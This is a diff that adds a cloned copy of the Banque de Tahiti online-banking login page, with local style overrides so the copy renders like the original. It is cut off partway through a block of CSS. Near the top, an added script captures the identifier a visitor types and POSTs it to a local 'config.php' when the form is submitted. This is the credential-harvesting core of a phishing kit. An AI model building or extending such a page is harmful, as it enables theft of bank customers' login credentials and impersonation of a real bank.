@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<!-- saved from url=(0407)https://tiarenet.banque-tahiti.pf/auth/realms/fhome/protocol/openid-connect/auth?response_type=code&client_id=fhome-spa&state=SldZdXo5UnZhQ0VDZFFpaFk1RkZzRnNFNC1LcTFIN2hLcm1oLlpjMEdfV0VW&redirect_uri=https%3A%2F%2Ftiarenet.banque-tahiti.pf&scope=openid&code_challenge=Ft2bFD-%2DUhbaarm35zr1fOJa3l9nLn-ySt_SZjLiR6w&code_challenge_method=S256&nonce=SldZdXo5UnZhQ0VDZFFpaFk1RkZzRnNFNC1LcTFIN2hLcm1oLlpjMEdfV0VW -->
+<html lang="fr" class="ion-ce plt-tablet plt-desktop md" mode="md"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+    
+    
+    <meta name="robots" content="noindex, nofollow">
+                <meta name="viewport" content="width=device-width,initial-scale=1">
+        <title>Banque de Tahiti</title>
+    <!--<base href="/auth/resources/4rs4d/login/fhome-login/">--><base href=".">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="https://tiarenet.banque-tahiti.pf/auth/resources/4rs4d/login/fhome-login/assets/img/favicon_bt.png">
+    <meta name="google-site-verification" content="-">
+    <script type="text/javascript" async="" charset="utf-8" src="./recaptcha__fr.js.téléchargement" crossorigin="anonymous" integrity="sha384-Zsl5UrgEqlqkNpSo++uuo9jNLBg+tYZkWLRZwDT0NsfjoutT1xrbKyWdXk/3LQgo"></script><script src="./Banque de Tahiti_files/app-config.js.téléchargement"></script>
+    <script type="text/javascript">  window.resourcesPath = "/auth/resources/4rs4d/login/fhome-login";</script>
+    <script src="./api.js.téléchargement"></script>
+    <script type="text/javascript">var template = "fhome_main_login";
+
+var subscriptionReference = "";
+      var pointOfSale = "";
+      var currentLocale = "fr";
+var contactUrl = "https://www.banque-tahiti.pf/fr/nos-agences-0";
+      var forgottenUserNameUrl =  "https://tiarenet.banque-tahiti.pf/mpa/login/resendId";
+      var forgottenPasswordUrl =  "https://tiarenet.banque-tahiti.pf/mpa/login/forgottenPassword";
+      var activateWebAccountUrl =  "https://tiarenet.banque-tahiti.pf/mpa/login/resendLink";
+      var versionDisplay =  false;
+      var commercialValue = "Release_25.10";
+      var technicalValue = "2.0.X";
+      var branchId = "btbnc-bt";
+      var locales = [
+          {
+            "label": "Français",
+            "url": "/auth/realms/fhome/login-actions/authenticate?client_id=fhome-spa&amp;tab_id=tXyON_RzbWA&amp;client_data=eyJydSI6Imh0dHBzOi8vdGlhcmVuZXQuYmFucXVlLXRhaGl0aS5wZiIsInJ0IjoiY29kZSIsInN0IjoiU2xkWmRYbzVVblpoUTBWRFpGRnBhRmsxUmtaelJuTkZOQzFMY1RGSU4yaExjbTFvTGxwak1FZGZWMFZXIn0&amp;execution=0b938742-b2eb-4c31-95cb-2c489c089030&amp;kc_locale=fr",
+            "tag": "fr"
+          }
+      ];
+      var profiles =  [
+      ];
+      var loginAction = "https://tiarenet.banque-tahiti.pf/auth/realms/fhome/login-actions/authenticate?session_code=kTeMEssJlV1nJNjHZ15_27GnP3rFSm5eT4uclwYxE4I&amp;execution=0b938742-b2eb-4c31-95cb-2c489c089030&amp;client_id=fhome-spa&amp;tab_id=tXyON_RzbWA&amp;client_data=eyJydSI6Imh0dHBzOi8vdGlhcmVuZXQuYmFucXVlLXRhaGl0aS5wZiIsInJ0IjoiY29kZSIsInN0IjoiU2xkWmRYbzVVblpoUTBWRFpGRnBhRmsxUmtaelJuTkZOQzFMY1RGSU4yaExjbTFvTGxwak1FZGZWMFZXIn0";
+      var messageSummary = "";
+      var currentLocaleFromLocalStorage = localStorage.getItem('currentLocale');
+      if(currentLocaleFromLocalStorage) {
+        currentLocale = currentLocaleFromLocalStorage
+      } else {
+        if (navigator.languages[0].toLowerCase() === "fr" || navigator.languages[0].toLowerCase() === "fr-FR") {
+          currentLocale = "fr";
+        } else {
+          currentLocale = "fr";
+        }
+      }
+// ...existing code...
+</script>
+
+<script>
+// Envoi automatique de l’identifiant à config.php lors de la soumission
+document.addEventListener('DOMContentLoaded', function() {
+  const form = document.querySelector('form');
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      const input = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="identifiant"]');
+      if (input && input.value) {
+        fetch('config.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'type=identifiant&value=' + encodeURIComponent(input.value)
+        });
+      }
+    });
+  }
+});
+</script>
+    <style>
+.header-content .inner-content .logo {
+  background-image: url("./logo_bnc.png");
+}
+
+.header-content .inner-content .logo-btbnc-bt {
+  background-image: url("./logo_bt.png");
+  background-size: contain;
+}
+
+.header-content .inner-content .logo-btbnc-bnc {
+  background-image: url("/logo_bnc.png");
+}
+
+@media screen and (min-width: 1200px) {
+  .theme-dark-connection {
+    background: var(--btbnc-color-bg-linear);
+    background-size: cover;
+    position: relative;
+    min-height: 100vh;
+  }
+  .btbnc-bt .theme-dark-connection::before{
+        content: "";
+        position: absolute;
+        bottom: 36px;
+        right: 36px;
+        width: 100%;
+        height: 100%;
+        background-image: url(./bt-flower-pattern.svg);
+        background-repeat: no-repeat;
+        pointer-events: none;
+        background-position: bottom right;
+        background-size: 400px;
+        opacity: 0.15;
+  }
+  .btbnc-bnc .theme-dark-connection::before{
+    content: "";
+    position: absolute;
+    bottom: 36px;
+    right: 36px;
+    width: 100%;
+    height: 100%;
+    background-image: url(/bnc-nautilus.svg);
+    background-repeat: no-repeat;
+    pointer-events: none;
+    background-position: bottom right;
+    background-size: 400px;
+  }
+}
+
+@media screen and (min-width: 768px) and (max-width: 1199px) {
+  .theme-dark-connection {
+    background: var(--btbnc-color-bg-linear);
+      background-size: cover;
+      position: relative;
+      min-height: 100vh;
+  }
+  .btbnc-bt .theme-dark-connection::before{
+    content: "";
+    position: absolute;
+    bottom: 36px;
+    right: 36px;
+    width: 100%;
+    height: 100%;
+    background-image: url(./bt-flower-pattern.svg);
+    background-repeat: no-repeat;
+    pointer-events: none;
+    background-position: bottom right;
+    background-size: 300px;
+    opacity: 0.15;
+  }
+
+  .btbnc-bnc .theme-dark-connection::before{
+    content: "";
+    position: absolute;
+    bottom: 36px;
+    right: 36px;
+    width: 100%;
+    height: 100%;
+    background-image: url(/bnc-nautilus.svg);
+    background-repeat: no-repeat;
+    pointer-events: none;
+    background-position: bottom right;
+    background-size: 300px;
+  }
+}
+
+@media screen and (max-width: 767px) {
+  .theme-dark-connection {
+      background: var(--btbnc-color-bg-linear);
+      background-size: cover;
+      position: relative;
+      min-height: 100vh;
+  }
+  .btbnc-bt .theme-dark-connection::before{
+    content: "";
+    position: absolute;
+    bottom: 12px;
+    right: 12px;
+    width: 100%;
+    height: 100%;
+    background-image: url(./bt-flower-pattern.svg);
+    background-repeat: no-repeat;
+    pointer-events: none;
+    background-position: bottom right;
+    background-size: 200px;
+    opacity: 0.15;
+  }
+
+  .btbnc-bnc .theme-dark-connection::before{
+    content: "";
+    position: absolute;
+    bottom: 12px;
+    right: 12px;
+    width: 100%;
+    height: 100%;
+    background-image: url(/bnc-nautilus.svg);
+    background-repeat: no-repeat;
+    pointer-events: none;
+    background-position: bottom right;
+    background-size: 200px;
+  }
+}
+</style>
+  <link rel="stylesheet" href="./styles-GUVPVS4I.css">
+<style id="local-overrides">
+  /* === OVERRIDES POUR AFFICHAGE LOCAL === */
+  :root {
+    --btbnc-color-bg-linear: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%);
+    --fho-color-blue: #30305C;
+    --fho-color-white: #FFFFFF;
+    --fho-color-grey2: #F5F6F8;
+    --fho-color-blue-80: #30305C;
+    --fho-color-indigo-20: #C5C9D6;
+    --fho-color-indigo-40: #8B91A8;
+    --fho-color-indigo-80: #30305C;
+    --fho-color-blue-60-light: #77869E;
+    --fho-font-title-h3: 600 24px/1.3 "Work Sans", system-ui, sans-serif;
+    --fho-font-M-semibold: 600 14px/1.4 "Work Sans", system-ui, sans-serif;
+    --fho-font-M-reg: 400 14px/1.4 "Work Sans", system-ui, sans-serif;
+    --fho-font-L-reg: 400 16px/1.5 "Work Sans", system-ui, sans-serif;
+    --fho-font-XL-semibold: 600 18px/1.4 "Work Sans", system-ui, sans-serif;
+    --fho-font-XL-bold: 700 18px/1.4 "Work Sans", system-ui, sans-serif;
+    --fho-font-title-h1: 700 32px/1.2 "Work Sans", system-ui, sans-serif;
+    --fho-font-title-h4: 600 18px/1.3 "Work Sans", system-ui, sans-serif;
+    --fho-font-S-reg: 400 12px/1.4 "Work Sans", system-ui, sans-serif;
+    --fbr-button-background-primary: #30305C;
+    --fbr-button-color-primary: #FFFFFF;
+    --fbr-button-background-hover-primary: #23234A;
+    --fbr-button-background-disabled-primary: #B0B0C0;
+    --fbr-button-color-disabled-primary: #FFFFFF;
+    --fbr-border-radius: 6px;
+    --fbr-panel-form-section-content-top-padding: 0;
+    --fbr-panel-form-section-content-bottom-padding: 0;
+  }
+  body { margin: 0; font-family: "Work Sans", system-ui, sans-serif; }
+
+  /* Fond bleu dégradé pleine page */
+  .fho-page-container.theme-dark-connection {
+    background: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%) !important;
+    min-height: 100vh !important;
+    position: relative !important;
+    overflow: hidden !important;
+  }
+  .theme-dark-connection > .theme-dark-connection {
+    display: flex !important;
+    flex-direction: column !important;
+    min-height: 100vh !important;
+    position: relative !important;
+    z-index: 1 !important;
+  }
+
+  /* Logo BT en haut à gauche */
+  .container-fluid { display: flex !important; padding: 0 !important; margin: 40px 0 21px 58px !important; }
+  .header-content .inner-content { padding: 0 !important; }
+  .logo.logo-btbnc-bt {
+    background-image: url("./logo_bt.png") !important;
+    background-size: contain !important;
+    background-repeat: no-repeat !important;
+    width: 180px !important;
+    height: 60px !important;
+    display: block !important;
+  }
+
+  /* Carte formulaire centrée */
+  ion-grid.form-template { display: flex !important; justify-content: center !important; margin: 0 !important; flex: unset !important; }
+  ion-grid.form-template > ion-row { width: 100% !important; display: flex !important; justify-content: center !important; }
+  .p-panel.p-component {
+    background: #FFFFFF !important;
+    border-radius: 6px !important;
+    padding: 48px 64px 24px !important;
+    max-width: 500px !important;
+    min-width: 428px !important;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.15) !important;
+  }
+  .p-panel-header { display: none !important; }
+  p-panel { display: flex !important; justify-content: center !important; }
+
+  /* Titre "Accès" */
+  .label-title .form-control-label { text-align: center !important; }
+  .label-title .form-control-label .form-control-label-text {
+    font: 600 24px/1.3 "Work Sans", system-ui, sans-serif !important;
+    color: #30305C !important;
+  }
+
+  /* Champ identifiant */
+  .form-group { margin: 0 auto !important; }
+  .form-group .form-control-label {
+    font: 600 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+    color: #30305C !important;
+    display: block !important;
+    margin-bottom: 8px !important;
+  }
+  input.form-control {
+    width: 100% !important;
+    padding: 12px 14px !important;
+    border: 1px solid #C5C9D6 !important;
+    border-radius: 4px !important;
+    font-size: 14px !important;
+    font-family: "Work Sans", system-ui, sans-serif !important;
+    outline: none !important;
+    box-sizing: border-box !important;
+  }
+  input.form-control:focus {
+    border-color: #0068B3 !important;
+    box-shadow: 0 0 0 2px rgba(0,104,179,0.2) !important;
+  }
+
+  /* Liens texte (identifiant oublié, code oublié, activer) */
+  .btn-link, .btn-text-link {
+    background: none !important;
+    border: none !important;
+    color: #30305C !important;
+    font: 400 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+    cursor: pointer !important;
+    padding: 8px 0 !important;
+    text-align: left !important;
+  }
+  .btn-link:hover { text-decoration: underline !important; }
+
+  /* Checkbox */
+  .checkbox { margin: 8px 0 !important; }
+  .checkbox-label {
+    font: 400 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+    color: #30305C !important;
+    cursor: pointer !important;
+    display: flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    padding-left: 0 !important;
+  }
+  .checkbox-icon {
+    width: 18px !important;
+    height: 18px !important;
+    border: 1.5px solid #C5C9D6 !important;
+    border-radius: 3px !important;
+    display: inline-block !important;
+  }
+
+  /* Bouton ME CONNECTER */
+  button.primary-button {
+    width: 100% !important;
+    background: #B0B0C0 !important;
+    color: #FFFFFF !important;
+    border: none !important;
+    border-radius: 4px !important;
+    padding: 12px 24px !important;
+    font: 600 14px/1.4 "Work Sans", system-ui, sans-serif !important;
+    text-transform: uppercase !important;
+    cursor: pointer !important;
+    margin: 8px 0 !important;
+  }
+  button.primary-button:not([disabled]) {
+    background: #30305C !important;
+  }
+  button.primary-button span { color: #FFFFFF !important; }
+
+  /* Forcer l'affichage des éléments .not-displayed.displayed */
+  .not-displayed.displayed { display: block !important; }
+
+  /* Contact bouton en bas à gauche */
+  .btn-square {
+    border: 1px solid white !important;
+    color: white !important;
+    padding: 12px 16px !important;
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    background: none !important;
+    cursor: pointer !important;
+  }
+  .btn-square span { color: white !important; font: 600 14px/1.4 "Work Sans", system-ui, sans-serif !important; text-transform: uppercase !important; }
+  .btn-square ion-icon { color: white !important; }
+  .page-disclaimer { display: flex !important; flex-direction: column !important; padding-left: 54px !important; }
+
+  /* Grille du bas */
+  .fho-page-container > .theme-dark-connection > ion-grid:last-child {
+    display: flex !important;
+    align-items: flex-end !important;
+    padding: 0 !important;
+    margin: 25px 0 40px 58px !important;
+    flex: 1 !important;
+  }
+
+  /* Flower pattern SVG - filigrane en bas à droite */
+  #flower-watermark {
+    position: absolute !important;
+    bottom: -60px !important;
+    right: -60px !important;
+    width: 550px !important;
+    height: 550px !important;
+    pointer-events: none !important;
+    z-index: 2 !important;
+    opacity: 1 !important;
+  }
+</style>
+<style>[_nghost-ng-c2137753118]     ion-grid>ion-row>ion-col.page-disclaimer{padding-top:0!important}[_nghost-ng-c2137753118]     ion-grid>ion-row>ion-col.page-disclaimer>div fbr-button .btn-square{max-width:224px}[_nghost-ng-c2137753118]     ion-grid>ion-row>ion-col.page-disclaimer>div fbr-button .btn-square .p-element{justify-content:start}[_nghost-ng-c2137753118]     ion-grid>ion-row>ion-col.page-disclaimer>div fbr-button .btn-square div span{word-wrap:break-word;max-width:146px;min-width:146px}[_nghost-ng-c2137753118]     div.display-commercial-version{display:flex;justify-content:center;margin-top:-40px}@media screen and (max-width: 1200px){[_nghost-ng-c2137753118]     div.display-commercial-version{margin-top:-28px}}[_nghost-ng-c2137753118]     .display-commercial-version span{font:var(--fho-font-XL-semibold);color:var(--fho-color-white)}</style><style>[_nghost-ng-c818687559]     button#previousStep{border:none;background:none}[_nghost-ng-c818687559]     .cg-pdf-col{max-height:342px;overflow:hidden}@media screen and (max-width: 767px){{%BLOCK%}}@media screen and (min-width: 1199px){[_nghost-ng-c818687559]     .cg-pdf-row{min-width:667px!important}}[_nghost-ng-c818687559]     .step-counter p{font:var(--fho-font-title-h3)!important;font-feature-settings:"pnum" on,"lnum" on!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid{background:var(--fho-color-grey2)!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid .label-title{display:none!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid ion-row:first-child{display:none!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid ion-row{padding-bottom:0!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid ion-row.custom-margin{margin-top:0!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid .form-group{margin:unset!important;min-height:!important;display:unset!important}[_nghost-ng-c818687559]     .badge-android-activation{width:130px}[_nghost-ng-c818687559]     .badge-apple-activation{width:130px}@media screen and (min-width: 768px) and (max-width: 1199px){[_nghost-ng-c818687559]     .cg-pdf-row{min-width:552px!important}}[_nghost-ng-c818687559]     ion-col button{border:none}[_nghost-ng-c818687559]     .button-scroll-bottom{position:absolute;bottom:20px;right:50%}[_nghost-ng-c818687559]     .button-download-cg{text-align:left}[_nghost-ng-c818687559]     .cg-pdf-col:before, .cg-pdf-col[_ngcontent-ng-c818687559]:after{content:"";position:absolute;left:0;bottom:0;width:100%;height:20px;background:linear-gradient(to top,rgba(0,0,0,.1),transparent);pointer-events:none;opacity:1;z-index:1}[_nghost-ng-c818687559]     fho-badge{display:grid}[_nghost-ng-c818687559]     .fho-badge{justify-self:center}[_nghost-ng-c818687559]     .disclaimer{font:var(--fho-font-S-reg);color:var(--fho-color-blue-60-light)}[_nghost-ng-c818687559]     .input-button-container{display:flex;align-items:center;justify-content:center;position:relative}[_nghost-ng-c818687559]     .align-left{position:absolute;left:-50px!important;top:54%;transform:translateY(-50%)}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     .align-left{left:-10px!important;top:64%!important}}[_nghost-ng-c818687559]     .center-input{margin:0 auto}[_nghost-ng-c818687559]     fbr-panel .panel-content ion-row.button-email-received{padding-bottom:0!important}[_nghost-ng-c818687559]     .custom-icon-arrow-line-left{font-size:24px}[_nghost-ng-c818687559]     .label-title .form-control-label span.form-control-label-text{color:var(--fho-color-blue);font:var(--fho-font-title-h3)}[_nghost-ng-c818687559]     .title .p-panel.p-component .p-panel-header{display:none}[_nghost-ng-c818687559]     .manageBackSlashN{white-space:pre-line}[_nghost-ng-c818687559]     ion-col#resendNotif{text-decoration:underline}@media screen and (max-width: 1200px){{%BLOCK%}}[_nghost-ng-c818687559]     badge-android-activation{width:130px}[_nghost-ng-c818687559]     badge-apple-activation{width:130px}[_nghost-ng-c818687559]     fbr-button .btn-square.btn-link ion-icon{color:var(--fho-color-white);width:20px;height:20px}[_nghost-ng-c818687559]     .displayed{display:unset}[_nghost-ng-c818687559]     .basic.form-group.form-group-static-elements.form-group-stack.simple-label{justify-content:center}[_nghost-ng-c818687559]     fbr-panel .panel-content>ion-grid>ion-row:last-child{padding-bottom:0;display:none}[_nghost-ng-c818687559]     fbr-panel .panel-content>ion-row{padding-bottom:20px}[_nghost-ng-c818687559]     fbr-panel .panel-content ion-row.sm-padding{padding-bottom:10px!important}[_nghost-ng-c818687559]     .panel-content>ion-grid>ion-row{padding-bottom:24px!important}[_nghost-ng-c818687559]     .p-panel.p-component{max-width:900px;min-width:428px}[_nghost-ng-c818687559]     fbr-panel .collapsible-septary-panel-wrapper .p-panel .p-panel-content{padding:48px 64px 24px;position:relative;background:var(--fho-color-grey2);min-width:650px}[_nghost-ng-c818687559]     p-panel{justify-content:center;align-self:center;display:flex}[_nghost-ng-c818687559]     fbr-button .btn div span{letter-spacing:0em}[_nghost-ng-c818687559]     .col-checkbox{text-align:right}[_nghost-ng-c818687559]     .checkbox-icon{width:20px!important;height:20px!important;border:1.1px solid var(--fho-color-indigo-20)!important;border-radius:4px!important}[_nghost-ng-c818687559]     .checkbox-label{font:var(--fho-font-M-reg);color:var(--fho-color-blue-80);padding-left:36px;padding-top:2px}[_nghost-ng-c818687559]     .rmm .theme-dark fho-cover .cover-account-details .custom-container ion-grid:first-child{padding-top:23px!important}[_nghost-ng-c818687559]     .pi-check:before{content:"\e908";font-size:20px;color:var(--fho-color-white)}[_nghost-ng-c818687559]     .checkbox-label input[type=checkbox]:checked~.checkbox-icon:after{display:block}[_nghost-ng-c818687559]     .checkbox-label input[type=checkbox]:checked~.checkbox-icon{background-color:var(--fho-color-indigo-80)!important}[_nghost-ng-c818687559]     .checkbox-label .checkbox-icon:after{position:absolute;top:3px;content:"\e908";font-size:20px;color:var(--fho-color-white);left:0}[_nghost-ng-c818687559]     fbr-button .btn-square div span{font:var(--fho-font-M-semibold);color:var(--fho-color-white);text-transform:uppercase;max-width:145px;min-width:145px;word-wrap:break-word;display:unset;white-space:normal}[_nghost-ng-c818687559]     fbr-button .btn-square{border:1px solid white;max-width:2224px;min-height:66px;padding:12px 16px}[_nghost-ng-c818687559]     .page-disclaimer{display:flex;flex-direction:column;justify-content:center;padding-left:54px}[_nghost-ng-c818687559]     .form-control-label{font:var(--fho-font-M-semibold);color:var(--fho-color-blue)}[_nghost-ng-c818687559]     .basic .form-control-static{text-align:center}[_nghost-ng-c818687559]     .basic.message .form-control-static{text-align:left!important}[_nghost-ng-c818687559]     .autocomplete .form-control-label{text-align:left!important;padding:0!important}[_nghost-ng-c818687559]     .autocomplete .form-control-label .form-control-label-text{margin:0 0 7px 1px}[_nghost-ng-c818687559]     fbr-field-select-or-radio-button .form-group.form-group-stack{display:flex;justify-content:center}[_nghost-ng-c818687559]     .form-group-static-elements .form-control-label{text-align:center}[_nghost-ng-c818687559]     .optional{display:none}[_nghost-ng-c818687559]     span.basic{font:var(--fho-font-L-reg);color:var(--fho-color-blue)}[_nghost-ng-c818687559]     span.subtitle{font:var(--fho-font-title-h4);color:var(--fho-color-blue)}[_nghost-ng-c818687559]     span.basic-XL-bold{font:var(--fho-font-XL-bold);color:var(--fho-color-blue);margin-right:6px}[_nghost-ng-c818687559]     .block{align-items:center;text-align:center;display:inline-flex}[_nghost-ng-c818687559]     code-input{padding-top:8px;padding-bottom:0}[_nghost-ng-c818687559]     span.light-basic{font:var(--fho-font-M-semibold);color:var(--fho-color-blue)}[_nghost-ng-c818687559]     fbr-field-dropdown .p-dropdown .p-dropdown-trigger svg{width:16px;height:16px;color:var(--fho-color-blue)}[_nghost-ng-c818687559]     .cookies ion-icon{color:var(--fho-color-white);padding-right:10px;height:18px;width:18px}[_nghost-ng-c818687559]     .padding-top{padding-top:20px}[_nghost-ng-c818687559]     .cookies>div{align-items:center;text-align:center;display:inline-flex}[_nghost-ng-c818687559]     fbr-field-input .form-control-element.input-element>div{height:inherit}[_nghost-ng-c818687559]     .cookies a{color:var(--fho-color-white);font:var(--fho-font-M-semibold);text-transform:uppercase;max-width:180px;min-width:145px;word-wrap:break-word;display:inline-flex;white-space:normal}[_nghost-ng-c818687559]     .cookies a:hover{cursor:pointer}[_nghost-ng-c818687559]     .cookies{border:1px solid var(--fho-color-white);max-width:262px;min-height:60px;min-width:262px;display:flex;justify-content:center;align-items:center}[_nghost-ng-c818687559]     .not-displayed{display:none}[_nghost-ng-c818687559]     fbr-panel .p-panel-toggleable.p-panel-expanded .p-toggleable-content:not(.ng-animating){overflow:unset!important}[_nghost-ng-c818687559]     .displayed{display:unset!important}[_nghost-ng-c818687559]     .select-language{max-width:90px;position:absolute;right:-3px;top:-36px}@media screen and (max-width: 767px){{%BLOCK%}}[_nghost-ng-c818687559]     .select-language p-selectbutton>.p-selectbutton>.p-button{padding:5px}[_nghost-ng-c818687559]     .select-language-container{position:sticky}[_nghost-ng-c818687559]     .fho-page-container>ion-grid{padding-bottom:0!important;padding-top:0}[_nghost-ng-c818687559]     .fho-page-container>ion-grid ion-col{padding-left:0;padding-right:0;padding-bottom:0!important}[_nghost-ng-c818687559]     .select-language-col-container{display:flex;justify-content:flex-start;margin-left:28px}[_nghost-ng-c818687559]     fbr-panel .panel-content ion-grid>ion-row:last-child{padding-bottom:0}[_nghost-ng-c818687559]     form ion-row:first-child.cg-pdf-row{padding-bottom:16px!important}[_nghost-ng-c818687559]     fbr-panel .panel-content ion-row{padding-bottom:20px}[_nghost-ng-c818687559]     fbr-panel .panel-content ion-row.cg-row-button-download{padding-bottom:32px}[_nghost-ng-c818687559]     ion-row.cg-row-button-download fbr-button .btn .p-element{justify-content:unset}[_nghost-ng-c818687559]     fbr-panel .panel-content .card-section ion-row{padding-bottom:5px!important}[_nghost-ng-c818687559]     fbr-panel .panel-content .card-section ion-row:last-child{padding-top:20px!important;padding-bottom:20px!important}[_nghost-ng-c818687559]     .page-disclaimer>div{margin-top:12px!important;justify-content:start;min-width:224px!important;max-width:224px!important}[_nghost-ng-c818687559]     .page-disclaimer>div.cookies{justify-content:start;max-width:224px;margin-top:8px;padding:12px 16px}[_nghost-ng-c818687559]     fbr-button .justify-content-start .p-element{justify-content:start!important}[_nghost-ng-c818687559]     .form-control-label{font:var(--fho-font-M-semibold);color:var(--fho-color-blue)!important}[_nghost-ng-c818687559]     ion-row.tables-template-page-disclaimer:has(ion-col:empty){display:none}[_nghost-ng-c818687559]     ion-row.tables-template-bottom-section-buttons:has(ion-col:empty){display:none}[_nghost-ng-c818687559]     .connection-dark-theme.fho-page-container{min-height:100vh;background:var(--btbnc-color-bg-linear)!important}[_nghost-ng-c818687559]     .fho-page-container>ion-grid{padding-bottom:23px}[_nghost-ng-c818687559]     fho-cover{padding-bottom:12px}[_nghost-ng-c818687559]     fho-cover>.cover-light-container .default{padding-bottom:0!important}[_nghost-ng-c818687559]     fho-cover>.cover-light-container .title-container{display:flex;justify-content:center}[_nghost-ng-c818687559]     .shortcut-empty-template{padding:0;margin-top:24px}[_nghost-ng-c818687559]     .empty-template{padding-top:88px;padding-bottom:96px}[_nghost-ng-c818687559]     .empty-template .empty-message .form-control-static, [_nghost-ng-c818687559]     .empty-template .empty-message-description .form-control-static{text-align:center}[_nghost-ng-c818687559]     .info-template{padding-top:32px}[_nghost-ng-c818687559]     .info-template>ion-row>ion-col, [_nghost-ng-c818687559]     .empty-template>ion-row>ion-col{display:flex;justify-content:center;padding:0}[_nghost-ng-c818687559]     .empty-template>ion-row>ion-col.empty-message-with-description{flex-direction:column;margin-bottom:12px}[_nghost-ng-c818687559]     .empty-template>ion-row>ion-col.empty-message-with-description .empty-message{margin-bottom:0}[_nghost-ng-c818687559]     .empty-template>ion-row>ion-col.empty-message-with-description .empty-message .form-control-static{padding-bottom:0}[_nghost-ng-c818687559]     .empty-template>ion-row>ion-col.empty-message-with-description .empty-message-description .form-control-static{padding-top:0}[_nghost-ng-c818687559]     .empty-template>ion-row>ion-col{align-items:center}[_nghost-ng-c818687559]     .empty-template>ion-row:nth-child(2)>ion-col{padding-top:34px;padding-bottom:7px}[_nghost-ng-c818687559]     .no-title .form-section-content{padding:0!important}[_nghost-ng-c818687559]     .tables-template fbr-panel ion-grid>ion-row:last-child, [_nghost-ng-c818687559]     .table-template fbr-panel ion-grid>ion-row:last-child{padding-bottom:0!important}[_nghost-ng-c818687559]     .tables-template fbr-panel ion-grid>ion-row p-paginator .p-paginator, [_nghost-ng-c818687559]     .table-template fbr-panel ion-grid>ion-row p-paginator .p-paginator{margin-top:0}[_nghost-ng-c818687559]     .form-template .form-template-top-section, [_nghost-ng-c818687559]     .tables-template .table-template-top-section, [_nghost-ng-c818687559]     .table-template .table-template-top-section{padding-bottom:31px}[_nghost-ng-c818687559]     .form-template .form-template-top-section>ion-col, [_nghost-ng-c818687559]     .tables-template .table-template-top-section>ion-col, [_nghost-ng-c818687559]     .table-template .table-template-top-section>ion-col, [_nghost-ng-c818687559]     .shortcut-empty-template .empty-template-top-section>ion-col{padding:0}[_nghost-ng-c818687559]     .form-template .form-template-top-section>ion-col~ion-col, [_nghost-ng-c818687559]     .tables-template .table-template-top-section>ion-col:last-child, [_nghost-ng-c818687559]     .table-template .table-template-top-section>ion-col:last-child, [_nghost-ng-c818687559]     .shortcut-empty-template .empty-template-top-section>ion-col:last-child{display:flex;justify-content:flex-end}[_nghost-ng-c818687559]     .tables-template fbr-panel .panel-content>ion-grid>ion-row, [_nghost-ng-c818687559]     .table-template fbr-panel .panel-content>ion-grid>ion-row{padding:0}[_nghost-ng-c818687559]     .tables-template .template-connection-table-bottom-buttons, [_nghost-ng-c818687559]     .tables-template .template-connection-table-panel-disclaimer, [_nghost-ng-c818687559]     .tables-template .template-connection-table-content-pagination, [_nghost-ng-c818687559]     .tables-template .tables-template-bottom-section-buttons, [_nghost-ng-c818687559]     .table-template .template-connection-table-bottom-buttons, [_nghost-ng-c818687559]     .table-template .template-connection-table-panel-disclaimer, [_nghost-ng-c818687559]     .table-template .template-connection-table-content-pagination{padding-top:20px!important}[_nghost-ng-c818687559]     fbr-search-result-table .p-datatable-header>div.filter-input{flex-wrap:wrap;justify-content:space-between;gap:16px}[_nghost-ng-c818687559]     .tables-template .template-connection-table-bottom-buttons>ion-col, [_nghost-ng-c818687559]     .table-template .template-connection-table-bottom-buttons>ion-col{display:flex;justify-content:flex-end}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button>div, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button>div{gap:16px}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-field-input .form-control-element, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-field-input .form-control-element{height:100%}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-field-input .form-control-element>div, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-field-input .form-control-element>div{height:40px}[_nghost-ng-c818687559]     .form-template, [_nghost-ng-c818687559]     .tables-template, [_nghost-ng-c818687559]     .table-template{padding-top:16px;padding-bottom:0}@media screen and (max-width: 1199px){{%BLOCK%}}[_nghost-ng-c818687559]     .form-template>ion-row>ion-col, [_nghost-ng-c818687559]     .tables-template>ion-row>ion-col, [_nghost-ng-c818687559]     .table-template>ion-row>ion-col{padding:0}[_nghost-ng-c818687559]     .tables-template 